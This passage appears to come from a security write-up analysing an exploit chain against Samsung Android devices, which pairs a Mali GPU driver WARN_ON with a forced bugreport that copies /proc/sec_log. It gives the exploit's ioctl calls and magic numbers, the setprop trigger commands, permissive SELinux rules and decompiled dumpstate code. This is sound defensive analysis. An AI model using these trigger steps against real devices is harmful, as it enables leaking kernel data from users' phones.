 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;put_user</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">HWCNT_READER_API</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">u32 __user </span><span class="vdnyYxSRCi-c0">*)</span><span class="vdnyYxSRCi-c4">arg</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">break</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">case</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_HWCNT_READER_GET_HWVER</span><span class="vdnyYxSRCi-c0">:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;kbasep_vinstr_hwcnt_reader_ioctl_get_hwver</span><span class="vdnyYxSRCi-c0">(</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">u32 __user </span><span class="vdnyYxSRCi-c0">*)</span><span class="vdnyYxSRCi-c4">arg</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">break</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">case</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_HWCNT_READER_GET_BUFFER_SIZE</span><span class="vdnyYxSRCi-c0">:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;put_user</span><span class="vdnyYxSRCi-c0">(</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">u32</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">cli</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">vctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">metadata</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">dump_buf_bytes</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">u32 __user </span><span class="vdnyYxSRCi-c0">*)</span><span class="vdnyYxSRCi-c4">arg</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">break</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&nbsp; &nbsp; &nbsp; &nbsp; </span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">[...]</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">default</span><span class="vdnyYxSRCi-c0">:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WARN_ON</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">true</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcode </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">break</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;rcode</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Specifically the </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;is in the function </span><span class="vdnyYxSRCi-c2">kbase_vinstr_hwcnt_reader_ioctl</span><span>. To trigger, the exploit only needs to call an invalid ioctl number for the HWCNT driver and the </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;will be hit. The exploit makes two ioctl calls: the first is the Mali driver&rsquo;s </span><span class="vdnyYxSRCi-c2">HWCNT_READER_SETUP</span><span class="vdnyYxSRCi-c7">&nbsp;ioctl to initialize the hwcnt driver and be able to call ioctl&rsquo;s and then to the hwcnt ioctl target with an invalid ioctl number: 0xFE.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.5740d1b795e6d8f3d2789813a2e7543c30152854"></a><a id="t.8"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp;hwcnt_fd </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;ioctl</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">dev_mali_fd</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x40148008</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">v4</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp;ioctl</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">hwcnt_fd</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x4004BEFE</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">);</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To trigger the vulnerability the exploit sends an invalid ioctl to the HWCNT driver a few times and then </span><span>triggers a bug report</span><span class="vdnyYxSRCi-c7">&nbsp;by calling:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.71e1e052b900c100803e05db5cd418f563a1e76f"></a><a id="t.9"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">setprop dumpstate</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">options bugreportfull</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">setprop ctl</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">start bugreport</span><span class="vdnyYxSRCi-c0">;</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>In Android, t</span><span>he property </span><span class="vdnyYxSRCi-c2">ctl.start</span><span>&nbsp;starts a service that is defined in </span><span class="vdnyYxSRCi-c2">init</span><span>. On the targeted Samsung devices, the SELinux policy for who has access to the </span><span class="vdnyYxSRCi-c2">ctl.start</span><span>&nbsp;property is much more permissive than AOSP&rsquo;s policy. Most notably in this exploit&rsquo;s case, </span><span class="vdnyYxSRCi-c2">system_app</span><span>&nbsp;has access to set </span><span class="vdnyYxSRCi-c2">ctl_start</span><span class="vdnyYxSRCi-c7">&nbsp;and thus initiate the bugreport. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.22b28c103561fd0f51d7a87c9f8dd7a76750e7dd"></a><a id="t.10"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow at_distributor ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow at_distributor ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow bootchecker ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow bootchecker ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow dumpstate property_type</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow hal_keymaster_default ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow hal_keymaster_default ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow ikev2_client ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow ikev2_client ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow init property_type</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append create getattr map open read relabelto rename setattr unlink write </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow init property_type</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow keystore ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow keystore ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow mediadrmserver ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow mediadrmserver ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow multiclientd ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow multiclientd ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow radio ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow radio ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow shell ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow shell ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow surfaceflinger ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow surfaceflinger ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">allow system_app ctl_start_prop</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">:</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">allow system_app ctl_start_prop</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">:</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">property_service </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">set</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow system_server ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow system_server ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow vold ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow vold ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow wlandutservice ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow wlandutservice ctl_start_prop</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">property_service </span><span class="vdnyYxSRCi-c5">set</span><span class="vdnyYxSRCi-c0">;</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The bugreport service is defined in </span><span class="vdnyYxSRCi-c2">/system/etc/init/dumpstate.rc</span><span class="vdnyYxSRCi-c7">:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.a28f679f59f4b6f4de860e93ae1130f9799f221a"></a><a id="t.11"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">service bugreport </span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">system</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">bin</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">dumpstate </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">d </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">p </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">B </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">z </span><span class="vdnyYxSRCi-c0">\</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">o </span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">user_de</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">com</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">android</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">shell</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">files</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">bugreports</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c3">bugreport</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">class</span><span class="vdnyYxSRCi-c3">&nbsp;main</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&nbsp; &nbsp; disabled</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; oneshot</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c2">bugreport</span><span>&nbsp;service in </span><span class="vdnyYxSRCi-c2">dumpstate.rc</span><span>&nbsp;is a Samsung-specific customization. The </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject">AOSP version of </a></span><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c27"><a class="vdnyYxSRCi-c61" href="https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject">dumpstate.rc</a></span><span class="vdnyYxSRCi-c7">&nbsp;doesn&rsquo;t include this service.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The Samsung version of the </span><span class="vdnyYxSRCi-c2">dumpstate</span><span>&nbsp;(</span><span class="vdnyYxSRCi-c2">/system/bin/dumpstate</span><span>) binary then copies everything from </span><span class="vdnyYxSRCi-c2">/proc/sec_log</span><span>&nbsp;to </span><span class="vdnyYxSRCi-c2">/data/log/</span><span class="vdnyYxSRCi-c2">sec_log</span><span class="vdnyYxSRCi-c2">.log</span><span>&nbsp;as shown in the pseudo-code below. This is the first few lines of the </span><span class="vdnyYxSRCi-c2">dumpstate()</span><span>&nbsp;function within the </span><span class="vdnyYxSRCi-c2">dumpstate</span><span>&nbsp;binary. The </span><span class="vdnyYxSRCi-c2">dump_sec_log</span><span class="vdnyYxSRCi-c7">&nbsp;(symbols included within the binary) function copies everything from the path provided in argument two to the path provided in argument three.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.d1bbc0067f19bca88f96968d3c911e88cda5b376"></a><a id="t.12"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; _ReadStatusReg</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ARM64_SYSREG</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">3</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">3</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">13</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">2</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; LOBYTE</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">s</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">18</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; v650</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">]</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0LL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; s_8 </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">17664LL</span><span class="vdnyYxSRCi-c0">;</span></p>
